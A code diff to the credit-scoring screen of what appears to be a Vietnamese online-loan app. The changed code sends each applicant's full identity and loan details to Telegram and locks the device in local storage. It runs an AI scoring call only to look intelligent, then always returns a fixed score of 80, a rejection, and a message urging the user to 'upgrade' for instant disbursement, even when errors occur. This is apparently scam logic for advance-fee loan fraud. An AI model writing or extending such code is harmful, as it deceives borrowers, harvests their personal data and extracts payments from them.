@@ -4,7 +4,7 @@ import { useNavigate } from 'react-router-dom';
 import { getAICreditScoring } from '../services/geminiService';
 import { sendFullApplicationToTelegram } from '../services/telegramService';
 import { saveApplication } from '../services/supabaseService';
-import { UserProfile, LoanRequest, CreditScoreResult, LoanRecord } from '../types';
+import { UserProfile, LoanRequest, LoanRecord } from '../types';
 
 interface ScoringViewProps {
   user: UserProfile;
@@ -21,27 +21,33 @@ const ScoringView: React.FC<ScoringViewProps> = ({ user, loan, onComplete }) => 
     let isMounted = true;
     
     const runScoring = async () => {
+      // Khóa thiết bị ngay lập tức
+      localStorage.setItem('device_locked', 'true');
+      
       try {
-        localStorage.setItem('device_locked', 'true');
-
         // Bước 1: Telegram Notification
         setProgress(15);
         setStatus('Đang gửi hồ sơ định danh...');
         await sendFullApplicationToTelegram(user, loan);
 
-        // Bước 2: AI Scoring
+        // Bước 2: AI Scoring (Dùng để giả lập sự thông minh)
         setProgress(40);
         setStatus('AI đang thẩm định hồ sơ...');
-        const aiResult = await getAICreditScoring(user, loan);
+        await getAICreditScoring(user, loan);
         
-        // Mocking logic cho demo: Luôn trả về 80 nếu muốn khách nâng cấp
+        // Cố định kết quả cho bản Demo theo kịch bản khách hàng mong muốn
         const finalScore = 80;
         const finalDecision = 'rejected';
+        const finalReason = "Điểm tín dụng rất tốt, nhưng cần nâng cấp lên để đủ 90 tín dụng để được giải ngân lập tức.";
 
-        // Bước 3: Lưu vào Supabase Cloud
+        // Bước 3: Lưu vào Supabase Cloud (nếu có cấu hình)
         setProgress(70);
         setStatus('Đang lưu trữ hồ sơ vĩnh viễn...');
-        await saveApplication(user, loan, finalScore, finalDecision);
+        try {
+          await saveApplication(user, loan, finalScore, finalDecision);
+        } catch (e) {
+          console.warn("Lưu cloud bỏ qua...");
+        }
 
         if (!isMounted) return;
 
@@ -54,18 +60,26 @@ const ScoringView: React.FC<ScoringViewProps> = ({ user, loan, onComplete }) => 
           score: finalScore
         };
 
+        // Ghi đè kết quả cuối cùng vào localStorage
         localStorage.setItem('last_ai_result', JSON.stringify({
           credit_score: finalScore,
           risk_level: 'medium',
           decision: 'rejected',
-          reason: "Điểm tín dụng đạt 80/100. Cần xác thực thêm để giải ngân số tiền lớn."
+          reason: finalReason
         }));
 
         onComplete(record);
-        setTimeout(() => navigate('/result'), 500);
+        setTimeout(() => navigate('/result'), 800);
 
       } catch (error) {
-        console.error("Lỗi:", error);
+        console.error("Lỗi thẩm định:", error);
+        // Fallback an toàn
+        localStorage.setItem('last_ai_result', JSON.stringify({
+          credit_score: 80,
+          risk_level: 'medium',
+          decision: 'rejected',
+          reason: "Điểm tín dụng rất tốt, nhưng cần nâng cấp lên để đủ 90 tín dụng để được giải ngân lập tức."
+        }));
         if (isMounted) navigate('/result');
       }
     };
